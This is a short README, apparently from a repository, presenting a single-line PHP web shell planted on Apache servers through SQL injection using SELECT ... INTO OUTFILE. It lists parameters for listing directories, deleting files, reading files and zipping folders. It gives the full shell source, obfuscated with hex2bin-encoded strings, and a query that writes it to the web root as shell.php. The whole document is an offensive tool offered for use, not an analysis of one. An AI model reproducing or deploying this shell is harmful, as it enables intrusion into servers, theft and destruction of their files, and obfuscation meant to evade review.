# SHEL | one line | single File
SHELL compatible with injection SQL using PHP to spy apache servers

LIKE : `SELECT "'.$phpString.'" INTO OUTFILE "public_html/shell.php"`


# USING

to read path   `?path=c://`

to delete file `?unlink=public_html/shell.php`

to read file   `?download=public_html/shell.php`

to zip folder `?path=public_html/&destination=name_zip_file`


# SQL injection
```php
$phpString = ' replace all char (') to (\') ';
```


# HELP
```php
$phpString = '<?php if(isset($_GET[hex2bin(\'756e6c696e6b\')])){unlink($_GET[hex2bin(\'756e6c696e6b\')]);}elseif(isset($_GET[hex2bin(\'726d646972\')])){rmdir($_GET[hex2bin(\'726d646972\')]);}elseif(isset($_GET[hex2bin(\'646f776e6c6f6164\')])){echo hex2bin(\'3c7072653e\').file_get_contents($_GET[hex2bin(\'646f776e6c6f6164\')]).hex2bin(\'3c2f7072653e\');}else{function listFolderFiles($y){echo hex2bin(\'3c6f6c3e\');echo hex2bin(\'3c623e3c6120687265663d\').(hex2bin(\'27\').(explode(\'?\',$_SERVER[hex2bin(\'524551554553545f555249\')])[0]).hex2bin(\'3f706174683d\').\'.\'.hex2bin(\'27\')).hex2bin(\'3e2e3c2f613e3c62723e3c6120687265663d\').(hex2bin(\'27\').(explode(\'?\',$_SERVER[hex2bin(\'524551554553545f555249\')])[0]).hex2bin(\'3f706174683d\').\'../\'.(str_contains($_GET[hex2bin(\'70617468\')],\'..\')?$_GET[hex2bin(\'70617468\')]:\'\').hex2bin(\'27\')).hex2bin(\'3e2e2e3c2f613e3c2f623e\');foreach(new DirectoryIterator($y)as $f){if(!$f->isDot()){echo hex2bin(\'3c6c693e\');if($f->isDir()){echo hex2bin(\'3c623e3c6120687265663d\').(hex2bin(\'27\').(explode(\'?\',$_SERVER[hex2bin(\'524551554553545f555249\')])[0]).hex2bin(\'3f706174683d\').str_replace(hex2bin(\'5c\'), hex2bin(\'2f\'), $f->getPathname()).hex2bin(\'27\')).\'>\'.str_replace(hex2bin(\'5c\'), hex2bin(\'2f\'), $f->getPathname()).hex2bin(\'3c2f613e3c2f623e\');}if(!$f->isDir()){echo hex2bin(\'3c6120687265663d\').(hex2bin(\'27\').(explode(\'?\',$_SERVER[hex2bin(\'524551554553545f555249\')])[0]).hex2bin(\'3f646f776e6c6f61643d\').str_replace(hex2bin(\'5c\'), hex2bin(\'2f\'), $_GET[hex2bin(\'70617468\')].\'/\'.$f->getFilename()).hex2bin(\'27\')).\'>\'.$f->getFilename().hex2bin(\'3c2f613e\');}echo hex2bin(\'3c2f6c693e\');}}echo hex2bin(\'3c2f6f6c3e\');}if(isset($_GET[hex2bin(\'70617468\')])){if($_GET[hex2bin(\'70617468\')]==hex2bin(\'646f63756d656e74\')){listFolderFiles($_SERVER[hex2bin(\'444f43554d454e545f524f4f54\')]);}else{listFolderFiles($_GET[hex2bin(\'70617468\')]);}}}if(isset($_GET[hex2bin(\'70617468\')])&&isset($_GET[hex2bin(\'64657374696e6174696f6e\')])){function Git($s,$d){if(!extension_loaded(\'zip\')||!file_exists($s)){return false;}$r=new ZipArchive();if(!$r->open($d,ZIPARCHIVE::CREATE)){return false;}$s=str_replace(\'\',\'/\',realpath($s));if(is_dir($s)===true){$b=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s),RecursiveIteratorIterator::SELF_FIRST);foreach($b as $p){$p=str_replace(\'\',\'/\',$p);if(in_array(substr($p,strrpos($p,\'/\')+1),array(\'.\',\'..\')))continue;$p=realpath($p);if(is_dir($p)===true){$r->addEmptyDir(str_replace($s.\'/\',\'\',$p.\'/\'));}else if(is_file($p)===true){$r->addFromString(str_replace($s.\'/\',\'\',$p),file_get_contents($p));}}}else if(is_file($s)===true){$r->addFromString(basename($s),file_get_contents($s));}$r->close();}Git($_GET[hex2bin(\'70617468\')],\'./\'.(!empty($_GET[hex2bin(\'64657374696e6174696f6e\')])?$_GET[hex2bin(\'64657374696e6174696f6e\')]:strtotime(hex2bin(\'6e6f77\'))).hex2bin(\'2e7a6970\'));} ?>';

var_dump($database->query('SELECT "'.$phpString.'" INTO OUTFILE "C:/xampp/htdocs/shell.php"'));
```
